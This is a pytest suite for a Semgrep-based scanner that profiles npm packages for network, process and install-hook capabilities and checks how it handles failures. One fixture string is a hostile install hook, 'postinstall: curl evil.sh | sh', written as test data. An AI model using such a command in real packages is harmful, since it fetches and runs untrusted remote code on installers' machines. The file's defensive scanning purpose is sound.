"""Tests for backend.deps.scanner — the Semgrep-backed capability scanner.

The "real scan" tests run actual Semgrep against a fixture mini-package and
are skipped when the binary isn't installed. The failure-mode tests
(unavailable/timeout/bad-JSON/crash) monkeypatch the subprocess layer so they
never depend on Semgrep being present.
"""

from pathlib import Path

import pytest

from backend.deps import scanner
from backend.models.dependencies import CapabilityProfile
from backend.models.enums import CapabilityCategory, PathClass, SourceKind


FIXTURE_DIR = Path(__file__).parent / "fixtures" / "deps" / "mini-package"
DIST_ONLY_FIXTURE_DIR = Path(__file__).parent / "fixtures" / "deps" / "dist-only-package"

_semgrep_missing = scanner.resolve_semgrep_binary() is None


def test_classify_path_shipped():
    assert scanner.classify_path("index.js") == PathClass.SHIPPED
    assert scanner.classify_path("src/lib/util.js") == PathClass.SHIPPED


@pytest.mark.parametrize(
    "rel_path",
    ["dist/index.js", "lib/index.js", "build/main.js", "esm/index.mjs", "cjs/index.cjs"],
)
def test_classify_path_compiled_output_dirs_are_shipped(rel_path):
    """In an npm tarball, dist/ lib/ build/ esm/ cjs/ are usually the code that
    actually runs ("main": "dist/index.js").

    Regression: these were once classified BUILD, which category_set() excludes —
    so a package whose dist/index.js makes network/process calls reported no
    capabilities at all.
    """
    assert scanner.classify_path(rel_path) == PathClass.SHIPPED


def test_classify_path_test():
    assert scanner.classify_path("test/index.test.js") == PathClass.TEST
    assert scanner.classify_path("__tests__/foo.js") == PathClass.TEST
    assert scanner.classify_path("src/foo.spec.js") == PathClass.TEST


def test_classify_path_example():
    assert scanner.classify_path("examples/demo.js") == PathClass.EXAMPLE
    assert scanner.classify_path("docs/guide.js") == PathClass.EXAMPLE


def test_classify_path_build():
    assert scanner.classify_path("webpack.config.js") == PathClass.BUILD
    assert scanner.classify_path("rollup.config.mjs") == PathClass.BUILD
    assert scanner.classify_path("benchmarks/run.js") == PathClass.BUILD


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_scan_source_finds_expected_categories():
    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="mini-package", version="1.0.0"
    )

    assert profile.status == "ok"
    categories = profile.category_set()
    assert CapabilityCategory.PROCESS in categories
    assert CapabilityCategory.NETWORK in categories


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_scan_source_dist_only_package_reports_capabilities():
    """A package whose only code is dist/index.js — the common npm shape — must
    report that code's capabilities. Also exercises the variable-assigned and
    destructured require() forms end to end."""
    profile = await scanner.scan_source(
        DIST_ONLY_FIXTURE_DIR, SourceKind.NPM_TARBALL, name="dist-only-package", version="1.0.0"
    )

    assert profile.status == "ok"
    categories = profile.category_set()
    assert CapabilityCategory.NETWORK in categories
    assert CapabilityCategory.PROCESS in categories


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_scan_source_single_subfolder_package_dir_is_not_collapsed(tmp_path):
    """A package directory whose only content is one subdirectory (`src/`)
    must have its evidence addressed by the real relative path `src/index.js`
    — not collapsed to `index.js`. `scan_source` no longer calls any
    `content_root()`-style defensive collapse (deleted in PR C, since real
    `fetch_source()` output is already unwrapped); this pins that."""
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "index.js").write_text("require('child_process').exec('x');")

    profile = await scanner.scan_source(
        tmp_path, SourceKind.NPM_TARBALL, name="subfolder-pkg", version="1.0.0"
    )

    assert profile.status == "ok"
    files = {e.file.replace("\\", "/") for e in profile.evidence}
    assert "src/index.js" in files
    assert "index.js" not in files


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_scan_source_classifies_test_file_path():
    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="mini-package", version="1.0.0"
    )

    test_evidence = [e for e in profile.evidence if "test" in e.file]
    assert test_evidence, "Expected at least one finding inside test/index.test.js"
    assert all(e.path_class == PathClass.TEST for e in test_evidence)
    # Test-only evidence must not count toward category_set() (shipped-only).
    assert CapabilityCategory.FILESYSTEM not in profile.category_set()


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_scan_source_includes_flagged_install_hook():
    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="mini-package", version="1.0.0"
    )

    assert any("postinstall" in h for h in profile.install_hooks)
    assert not any("prepare" in h for h in profile.install_hooks)  # husky install is benign


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_scan_source_flags_install_time_evidence():
    """`scripts/setup.js` is run directly by the flagged postinstall hook —
    its evidence must carry install_time=True. index.js's evidence, which
    only runs when required, must not."""
    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="mini-package", version="1.0.0"
    )

    setup_evidence = [
        e for e in profile.evidence if e.file.replace("\\", "/") == "scripts/setup.js"
    ]
    assert setup_evidence, "expected evidence from scripts/setup.js"
    assert all(e.install_time for e in setup_evidence)
    assert any(e.category == CapabilityCategory.ENVIRONMENT for e in setup_evidence)

    index_evidence = [e for e in profile.evidence if e.file.replace("\\", "/") == "index.js"]
    assert index_evidence
    assert not any(e.install_time for e in index_evidence)


def test_category_set_includes_build_install_from_flagged_hook():
    """A flagged install hook is a capability even with zero Semgrep evidence
    for it — `build_install.yaml` was deleted (its one rule, non-literal
    require, moved to dynamic_code.yaml), so nothing else produces this
    category anymore."""
    profile = CapabilityProfile(
        name="pkg",
        version="1.0.0",
        source_kind=SourceKind.NPM_TARBALL,
        install_hooks=["postinstall: curl evil.sh | sh — ..."],
        status="ok",
    )

    assert CapabilityCategory.BUILD_INSTALL in profile.category_set()


def test_category_set_no_build_install_without_hooks():
    profile = CapabilityProfile(
        name="pkg", version="1.0.0", source_kind=SourceKind.NPM_TARBALL, status="ok"
    )

    assert CapabilityCategory.BUILD_INSTALL not in profile.category_set()


@pytest.mark.parametrize(
    ("start", "end", "expected_substring"),
    [
        ({"line": 1, "col": 1}, {"line": 1, "col": 5}, "eval"),
        ({"line": 2, "col": 1}, {"line": 2, "col": 4}, "fs"),
    ],
)
def test_extract_snippet_reads_real_line(start, end, expected_substring):
    lines = ["eval(x);", "fs.readFileSync(y);"]
    snippet = scanner._extract_snippet(lines, start, end)
    assert expected_substring in snippet


def test_extract_snippet_windows_minified_line():
    """A match deep inside a long single-line bundle must not just return the
    start of the line — the window must be centered on the match's columns."""
    prefix = "a" * 5000
    match = "eval(userInput)"
    suffix = "b" * 5000
    line = prefix + match + suffix
    match_start_col = len(prefix) + 1
    match_end_col = match_start_col + len(match)

    snippet = scanner._extract_snippet(
        [line], {"line": 1, "col": match_start_col}, {"line": 1, "col": match_end_col}
    )

    assert match in snippet
    assert len(snippet) <= scanner._SNIPPET_MAX_LEN + 6  # + "..." on both ends
    assert not snippet.startswith("a" * 100)


def test_extract_snippet_out_of_range_line_returns_empty():
    assert scanner._extract_snippet(["only line"], {"line": 5}, {"line": 5}) == ""


@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
@pytest.mark.asyncio
async def test_view_loader_nonliteral_require_is_dynamic_code_not_build_install(tmp_path):
    """Regression for the build_install.yaml -> dynamic_code.yaml move: a
    non-literal require() (the express view-engine-loader shape) must be
    categorized dynamic_code. There is no build_install rule left to
    misfire — this pins the category, not just the absence of a rule."""
    (tmp_path / "package.json").write_text('{"name": "view-pkg", "version": "1.0.0"}')
    (tmp_path / "index.js").write_text(
        "function loadView(engine) {\n  return require(engine);\n}\nmodule.exports = loadView;\n"
    )

    profile = await scanner.scan_source(
        tmp_path, SourceKind.NPM_TARBALL, name="view-pkg", version="1.0.0"
    )

    assert profile.status == "ok"
    assert CapabilityCategory.DYNAMIC_CODE in profile.category_set()
    assert CapabilityCategory.BUILD_INSTALL not in profile.category_set()


@pytest.mark.asyncio
async def test_scan_source_semgrep_unavailable(monkeypatch):
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: None)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_unavailable"
    assert profile.evidence == []


@pytest.mark.asyncio
async def test_scan_source_timeout(monkeypatch):
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    async def _raise_timeout(binary, target, extra_targets=()):
        raise TimeoutError

    monkeypatch.setattr(scanner, "_run_semgrep", _raise_timeout)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_timeout"


@pytest.mark.asyncio
async def test_scan_source_crash(monkeypatch):
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    async def _raise_oserror(binary, target, extra_targets=()):
        raise OSError("semgrep binary vanished")

    monkeypatch.setattr(scanner, "_run_semgrep", _raise_oserror)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_error"


@pytest.mark.asyncio
async def test_scan_source_bad_json(monkeypatch):
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    async def _return_garbage(binary, target, extra_targets=()):
        return 0, "not valid json {{{", ""

    monkeypatch.setattr(scanner, "_run_semgrep", _return_garbage)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_error"


@pytest.mark.asyncio
async def test_scan_source_unknown_rule_category_skipped(monkeypatch):
    """A result whose rule metadata has no valid `category` must be dropped,
    not crash the scan."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    fake_output = {
        "results": [
            {
                "check_id": "some-rule-without-category",
                "path": str(FIXTURE_DIR / "index.js"),
                "start": {"line": 1},
                "extra": {"lines": "require('child_process').exec('x')", "metadata": {}},
            }
        ]
    }

    async def _return_fake(binary, target, extra_targets=()):
        import json

        return 0, json.dumps(fake_output), ""

    monkeypatch.setattr(scanner, "_run_semgrep", _return_fake)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "ok"


@pytest.mark.asyncio
async def test_scan_source_nonzero_returncode_is_error(monkeypatch):
    """A non-zero Semgrep exit code must not be reported as a clean 'ok' scan."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    async def _return_fake(binary, target, extra_targets=()):
        import json

        return 2, json.dumps({"results": [], "errors": []}), "fatal: bad config"

    monkeypatch.setattr(scanner, "_run_semgrep", _return_fake)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_error"


@pytest.mark.asyncio
async def test_scan_source_fatal_error_in_output_is_error(monkeypatch):
    """A non-'warn' entry in Semgrep's own errors array must not be silently
    dropped — the profile must not claim 'ok' with missing evidence."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    fake_output = {
        "results": [],
        "errors": [{"level": "error", "type": ["RuleParseError"], "message": "bad rule"}],
    }

    async def _return_fake(binary, target, extra_targets=()):
        import json

        return 0, json.dumps(fake_output), ""

    monkeypatch.setattr(scanner, "_run_semgrep", _return_fake)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_error"


@pytest.mark.asyncio
async def test_scan_source_warn_only_error_stays_ok(monkeypatch):
    """A 'warn'-level entry (e.g. one file semgrep couldn't parse) is
    recoverable — the rest of the scan's evidence is still trustworthy and
    must be returned, not discarded."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")

    fake_output = {
        "results": [
            {
                "check_id": "backend.deps.rules.js.process-child-process-call",
                "path": str(FIXTURE_DIR / "index.js"),
                "start": {"line": 1},
                "extra": {
                    "lines": "require('child_process').exec('x')",
                    "metadata": {"category": "process"},
                },
            }
        ],
        "errors": [{"level": "warn", "type": ["PartialParsing"], "message": "one bad file"}],
    }

    async def _return_fake(binary, target, extra_targets=()):
        import json

        return 0, json.dumps(fake_output), ""

    monkeypatch.setattr(scanner, "_run_semgrep", _return_fake)

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "ok"
    assert len(profile.evidence) == 1


@pytest.mark.asyncio
async def test_run_semgrep_scan_single_call_for_few_extra_targets(tmp_path, monkeypatch):
    """The common case: few enough extra targets to fit in one command line
    stays a single semgrep invocation."""
    calls = []

    async def _fake_run(binary, target, extra_targets=()):
        calls.append(("dir", target, extra_targets))
        return 0, '{"results": [], "errors": []}', ""

    monkeypatch.setattr(scanner, "_run_semgrep", _fake_run)

    extra = tuple(tmp_path / f"f{i}.dat" for i in range(5))
    runs = await scanner._run_semgrep_scan("semgrep", tmp_path, extra)

    assert len(runs) == 1
    assert len(calls) == 1
    assert calls[0][2] == extra


@pytest.mark.asyncio
async def test_run_semgrep_scan_batches_many_extra_targets(tmp_path, monkeypatch):
    """More extra targets than fit under the argv-length budget are split
    across several invocations — the first covers the directory target plus
    the first batch, later ones scan only their batch of explicit files (no
    directory target), so a package shipping hundreds of non-JS-extension
    reachable files (or an attacker publishing one on purpose) can't blow the
    Windows argv length limit and silently turn the scan into semgrep_error."""
    dir_calls = []
    extra_only_calls = []

    async def _fake_run(binary, target, extra_targets=()):
        dir_calls.append((target, extra_targets))
        return 0, '{"results": [], "errors": []}', ""

    async def _fake_run_extra_only(binary, targets):
        extra_only_calls.append(targets)
        return 0, '{"results": [], "errors": []}', ""

    monkeypatch.setattr(scanner, "_run_semgrep", _fake_run)
    monkeypatch.setattr(scanner, "_run_semgrep_extra_only", _fake_run_extra_only)
    monkeypatch.setattr(scanner, "_MAX_EXTRA_TARGETS_ARGV_CHARS", 30)

    # Each path string is 5 chars ("f0.dat".."f6.dat" -> len 6 with the +1
    # separator counted by the batcher = 7; budget 30 fits 4 per batch.
    extra = tuple(Path(f"f{i}.dat") for i in range(7))
    runs = await scanner._run_semgrep_scan("semgrep", tmp_path, extra)

    assert len(runs) == len(dir_calls) + len(extra_only_calls)
    assert len(dir_calls) == 1
    all_batches = [dir_calls[0][1], *extra_only_calls]
    # Every extra target appears exactly once, across however many batches.
    assert sorted(p for batch in all_batches for p in batch) == sorted(extra)
    # And the budget was actually respected in every batch.
    for batch in all_batches:
        assert sum(len(str(p)) + 1 for p in batch) <= 30


def test_batch_by_argv_length_respects_budget(tmp_path):
    paths = tuple(Path(f"path-{i}") for i in range(10))
    batches = scanner._batch_by_argv_length(paths, budget=20)

    assert sorted(p for batch in batches for p in batch) == sorted(paths)
    for batch in batches:
        assert sum(len(str(p)) + 1 for p in batch) <= 20


def test_batch_by_argv_length_confirmed_bug_long_paths_overflow_a_count_based_cap(tmp_path):
    """The confirmed bug this length-based batcher fixes: a fixed per-batch
    *count* (the pre-fix design used 200) doesn't bound argv length at all
    when paths are long — 200 paths at ~250 chars each is already ~50,000
    characters, well past Windows' ~32K argv limit. A length-based budget
    must split a long-path batch into more, smaller pieces even though the
    old design would have called this "one batch"."""
    long_paths = tuple(Path("C:/cache/" + ("x" * 240) + f"/f{i}.js") for i in range(200))
    total_naive_length = sum(len(str(p)) + 1 for p in long_paths)
    assert total_naive_length > 32_000  # the exact scenario that used to overflow

    batches = scanner._batch_by_argv_length(
        long_paths, budget=scanner._MAX_EXTRA_TARGETS_ARGV_CHARS
    )

    assert len(batches) > 1
    for batch in batches:
        assert sum(len(str(p)) + 1 for p in batch) <= scanner._MAX_EXTRA_TARGETS_ARGV_CHARS
    assert sorted(p for batch in batches for p in batch) == sorted(long_paths)


@pytest.mark.asyncio
async def test_scan_source_caps_total_extra_targets_and_records_dropped(tmp_path, monkeypatch):
    """A package with more reachable non-standard-extension files than
    `_MAX_EXTRA_TARGETS_TOTAL` must never silently drop the excess — a
    `status="ok"` profile with unscanned reachable code would let an attacker
    who knows the cap hide a payload just past it (e.g. harmless files up to
    the cap, then the real payload one file later). The excess is instead
    recorded on `CapabilityProfile.unscanned_reachable_files`, which
    `backend.deps.drift` treats as its own strong signal."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")
    (tmp_path / "package.json").write_text('{"name": "pkg"}')

    unscanned = {f"f{i}.dat" for i in range(10)}
    monkeypatch.setattr(scanner, "find_reachable", lambda *a, **k: ({}, unscanned))
    monkeypatch.setattr(scanner, "_MAX_EXTRA_TARGETS_TOTAL", 6)

    seen_targets = []

    async def _fake_run_semgrep_scan(binary, target, extra_targets):
        seen_targets.extend(extra_targets)
        return [(0, '{"results": [], "errors": []}', "")]

    monkeypatch.setattr(scanner, "_run_semgrep_scan", _fake_run_semgrep_scan)

    profile = await scanner.scan_source(
        tmp_path, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "ok"
    scanned_names = {p.name for p in seen_targets}
    dropped_names = set(profile.unscanned_reachable_files)
    assert len(scanned_names) == 6
    assert len(dropped_names) == 4
    assert scanned_names.isdisjoint(dropped_names)
    assert scanned_names | dropped_names == unscanned


@pytest.mark.asyncio
async def test_scan_source_merges_results_across_batches(tmp_path, monkeypatch):
    """`scan_source` must treat several batched invocations as one scan:
    results and errors from every batch are combined, and a nonzero
    returncode in *any* batch still marks the whole scan incomplete."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")
    (tmp_path / "package.json").write_text('{"name": "pkg"}')

    async def _fake_run_semgrep_scan(binary, target, extra_targets):
        return [
            (0, '{"results": [{"check_id": "r1"}], "errors": []}', ""),
            (1, '{"results": [{"check_id": "r2"}], "errors": [{"level": "error"}]}', ""),
        ]

    monkeypatch.setattr(scanner, "_run_semgrep_scan", _fake_run_semgrep_scan)

    profile = await scanner.scan_source(
        tmp_path, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_error"


def _fake_run_returning(output: dict):
    async def _run(binary, target, extra_targets=()):
        import json

        return 0, json.dumps(output), ""

    return _run


@pytest.mark.asyncio
async def test_scan_source_per_file_timeout_is_not_ok(monkeypatch):
    """Semgrep reports a per-file timeout at level "warn". Evidence from that
    file may be missing, so the scan must not look clean."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")
    monkeypatch.setattr(
        scanner,
        "_run_semgrep",
        _fake_run_returning(
            {
                "results": [],
                "errors": [{"level": "warn", "type": "Timeout", "message": "dist/bundle.js"}],
            }
        ),
    )

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_timeout"


@pytest.mark.asyncio
async def test_scan_source_unknown_warn_kind_fails_closed(monkeypatch):
    """Only known parse-error kinds are recoverable; an unrecognized kind —
    even at level "warn" — must not be reported as a clean scan."""
    monkeypatch.setattr(scanner, "resolve_semgrep_binary", lambda: "semgrep")
    monkeypatch.setattr(
        scanner,
        "_run_semgrep",
        _fake_run_returning(
            {
                "results": [],
                "errors": [{"level": "warn", "type": ["Out of memory"], "message": "x"}],
            }
        ),
    )

    profile = await scanner.scan_source(
        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="pkg", version="1.0.0"
    )

    assert profile.status == "semgrep_error"
